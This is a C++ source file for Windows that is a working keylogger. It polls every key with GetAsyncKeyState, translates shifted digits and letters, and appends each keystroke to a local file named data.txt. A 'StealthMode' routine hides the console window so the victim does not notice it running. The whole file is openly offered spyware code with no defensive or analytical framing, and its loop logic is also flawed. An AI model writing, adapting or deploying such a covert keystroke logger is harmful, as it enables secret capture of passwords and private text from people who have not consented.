#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;

void StartLogging() {
    char c;

    while(true) {
        for(c = 8; c <= 256; c++){
            if(GetAsyncKeyState(c) == -32767) {

                ofstream file("data.txt", ios::app);

                if((c>64 && c<91) && !GetAsyncKeyState(0x10)) {
                    c+=32;
                    file << c;
                    file.close();
                    break;
                } else if(c>64 && c<91) {
                    file << c;
                    file.close();
                    break;
                } else {
                    switch (c) {
                        case 48:
                            if(GetAsyncKeyState(0x10))                  //GetAsyncKeyState(0x10) - sprawdza czy SHIFT jest wciśnięty
                                file << ")";                            				//zamiast if(GetAsyncKeyState(0x10))...else... można zrobić
                            else                                        				//ogólny przypadek case VK_SHIFT (ale wtedy tekst jest mniej
                                file << "0";                            				//czytelny)
                            break;
                        case 49:
                            if(GetAsyncKeyState(0x10))                  //GetAsyncKeyState(0x10) - checks if the shift key is pressed
                                file << "!";                            				//instead of if(GetAsyncKeyState(0x10))...else... you can do
                            else                                        				//a general case VK_SHIFT (but the text becomes less readable)
                                file << "1";
                            break;
                        case 50:
                            if(GetAsyncKeyState(0x10))
                                file << "@";
                            else
                                file << "2";
                            break;
                        case 51:
                            if(GetAsyncKeyState(0x10))
                                file << "#";
                            else
                                file << "3";
                            break;
                        case 52:
                            if(GetAsyncKeyState(0x10))
                                file << "$";
                            else
                                file << "4";
                            break;
                        case 53:
                            if(GetAsyncKeyState(0x10))
                                file << "%";
                            else
                                file << "5";
                            break;
                        case 54:
                            if(GetAsyncKeyState(0x10))
                                file << "^";
                            else
                                file << "6";
                            break;
                        case 55:
                            if(GetAsyncKeyState(0x10))
                                file << "&";
                            else
                                file << "7";
                            break;
                        case 56:
                            if(GetAsyncKeyState(0x10))
                                file << "*";
                            else
                                file << "8";
                            break;
                        case 57:
                            if(GetAsyncKeyState(0x10))
                                file << "(";
                            else
                                file << "9";
                            break;
                        case VK_SPACE:
                            file << " ";
                            break;
                        case VK_RETURN:
                            file << "\n";
                            break;
                        case VK_TAB:
                            file << "  ";
                            break;
                        case VK_BACK:
                            file << "<BACKSPACE>";
                            break;
                        case VK_DELETE:
                            file << "<DELETE>";
                            break;
                        default:
                            file << c;
                    }
                }
            }
        }
    }
}

void StealthMode(){                                            	 				//STEALTHMODE - tworzy uchwyt okna i go ukrywa
    HWND stealth;                                               					//   -||-     - creates a handle to a window and hides it
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", nullptr);
    ShowWindow(stealth,0);
}

int main(){
    StealthMode();
    StartLogging();
    return 0;
}